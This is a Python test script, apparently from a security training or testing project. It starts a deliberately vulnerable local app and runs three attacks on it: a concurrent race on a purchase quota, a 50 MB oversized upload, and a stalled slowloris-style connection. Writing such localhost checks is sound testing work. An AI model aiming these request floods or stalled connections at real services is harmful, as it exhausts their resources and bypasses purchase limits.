#!/usr/bin/env python3
"""
attacks/run_attacks.py — Windows-compatible port of attack_suite.sh

Runs the same three attacks against the vulnerable fixture using only the
Python standard library.  Mirrors the pass/fail semantics of attack_suite.sh.

Usage:
    python3 attacks/run_attacks.py fixtures/vulnerable_app.py
"""

import json
import socket
import subprocess
import sys
import time
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "127.0.0.1"
PORT = 8000
BASE = f"http://{HOST}:{PORT}"

OVERALL = 0   # accumulates failures


def log_pass(msg: str) -> None:
    print(f"  [PASS] {msg}")


def log_fail(msg: str) -> None:
    global OVERALL
    OVERALL = 1
    print(f"  [FAIL] {msg}")


def header(title: str) -> None:
    print(f"\n=== {title} ===")


def wait_for_server(retries: int = 30, delay: float = 0.3) -> None:
    for _ in range(retries):
        try:
            urllib.request.urlopen(f"{BASE}/stock", timeout=2)
            return
        except Exception:
            time.sleep(delay)
    print("ERROR: server did not start in time", file=sys.stderr)
    sys.exit(1)


# ---------------------------------------------------------------------------
# Attack A — Race condition on shared quota
# ---------------------------------------------------------------------------
def attack_a() -> None:
    header("Attack A: Lost-Update Race Condition (POST /buy)")

    CONCURRENCY = 50
    QUOTA = 5

    print(f"  Firing {CONCURRENCY} concurrent POST /buy requests (quota={QUOTA})...")

    def buy() -> int:
        try:
            req = urllib.request.Request(f"{BASE}/buy", method="POST", data=b"")
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return 0

    with ThreadPoolExecutor(max_workers=CONCURRENCY) as pool:
        futures = [pool.submit(buy) for _ in range(CONCURRENCY)]
        statuses = [f.result() for f in as_completed(futures)]

    successes = statuses.count(200)

    stock_resp = urllib.request.urlopen(f"{BASE}/stock", timeout=5)
    stock = json.loads(stock_resp.read())
    remaining = stock["remaining"]

    print(f"  Successful purchases : {successes}  (expected exactly {QUOTA})")
    print(f"  Stock remaining      : {remaining}  (expected 0)")

    if successes > QUOTA:
        log_fail(
            f"Race condition confirmed: {successes} purchases succeeded against "
            f"a quota of {QUOTA} (lost-update)."
        )
    elif successes < QUOTA:
        log_fail(
            f"Fewer than {QUOTA} purchases succeeded ({successes}). "
            "Check server stability."
        )
    else:
        log_pass(f"Exactly {QUOTA} purchases succeeded — no race detected on this run.")

    if remaining < 0:
        log_fail(f"Stock went negative ({remaining}) — definitive lost-update evidence.")
    elif remaining == 0:
        log_pass("Stock is exactly 0.")
    else:
        log_pass(f"Stock is {remaining} — some requests were rejected.")


# ---------------------------------------------------------------------------
# Attack B1 — Oversized payload
# ---------------------------------------------------------------------------
def attack_b1() -> None:
    header("Attack B1: Oversized Payload — Missing MAX_BODY_SIZE Guard (POST /upload)")

    PAYLOAD_MB = 50
    payload_bytes = PAYLOAD_MB * 1024 * 1024

    print(f"  Sending {PAYLOAD_MB} MB zero-filled payload to POST /upload...")

    status = 0
    try:
        data = b"\x00" * payload_bytes
        req = urllib.request.Request(
            f"{BASE}/upload",
            method="POST",
            data=data,
            headers={"Content-Type": "application/octet-stream"},
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            status = resp.status
    except urllib.error.HTTPError as e:
        status = e.code
    except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
        status = 0  # connection reset — treated same as 000 in the .sh script
    except Exception as exc:
        status = 0
        print(f"  (exception during upload: {exc})")

    print(f"  HTTP status received  : {status}  (expected 413 or 000/reset)")

    if status in (413, 0):
        log_fail(
            f"App rejected or reset the oversized payload (status={status}) — "
            "vulnerability NOT confirmed. A hardened app would do this; the fixture should not."
        )
    else:
        log_pass(
            f"Vulnerability confirmed: app accepted {PAYLOAD_MB} MB payload "
            f"without enforcing a size cap (status={status})."
        )


# ---------------------------------------------------------------------------
# Attack B2 — Stalled client / missing read deadline
# ---------------------------------------------------------------------------
def attack_b2() -> None:
    header("Attack B2: Stalled Client — Missing Read Deadline (POST /upload)")

    STALL_TIMEOUT = 6  # seconds

    print(
        f"  Opening raw TCP connection, sending headers only, "
        f"then going silent for {STALL_TIMEOUT}s..."
    )

    partial_request = (
        "POST /upload HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Length: 1000\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0123456789"   # only 10 of the promised 1000 bytes
    ).encode()

    hung = False
    start = time.monotonic()
    try:
        sock = socket.create_connection((HOST, PORT), timeout=10)
        sock.sendall(partial_request)
        # Set a recv timeout equal to the stall window; if the server
        # enforces a read deadline it will close the connection and recv
        # will return b"" or raise an error before the timeout fires.
        sock.settimeout(STALL_TIMEOUT)
        try:
            data = sock.recv(4096)
            elapsed = time.monotonic() - start
            if not data:
                # Server closed connection cleanly within the timeout
                hung = False
            else:
                # Server sent something (likely HTTP 408)
                hung = False
        except socket.timeout:
            elapsed = time.monotonic() - start
            hung = True   # server never closed the connection
        finally:
            sock.close()
    except Exception as exc:
        print(f"  (socket error: {exc})")
        hung = False

    elapsed = time.monotonic() - start
    print(f"  Elapsed: {elapsed:.2f}s  |  Hung: {hung}")

    if hung:
        log_pass(
            f"Vulnerability confirmed: server held the stalled connection open "
            f"beyond {STALL_TIMEOUT}s — no read deadline enforced."
        )
    else:
        log_fail(
            f"Server closed the stalled connection within {STALL_TIMEOUT}s — "
            "a hardened server would do this; the fixture should not."
        )


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path/to/app.py>", file=sys.stderr)
        sys.exit(1)

    app_path = sys.argv[1]
    print(f"Starting app: python3 {app_path}")

    proc = subprocess.Popen(
        [sys.executable, app_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=None,   # inherit CWD from caller
    )

    try:
        wait_for_server()
        print("Server is up.")

        attack_a()
        attack_b1()
        attack_b2()

        header("Summary")
        if OVERALL == 0:
            print("All expected vulnerabilities were confirmed in the fixture.")
        else:
            print("One or more attacks did not confirm the expected vulnerability.")
        print(f"Exit code: {OVERALL}")

    finally:
        print("\nStopping server...")
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        print("Done.")

    sys.exit(OVERALL)


if __name__ == "__main__":
    main()
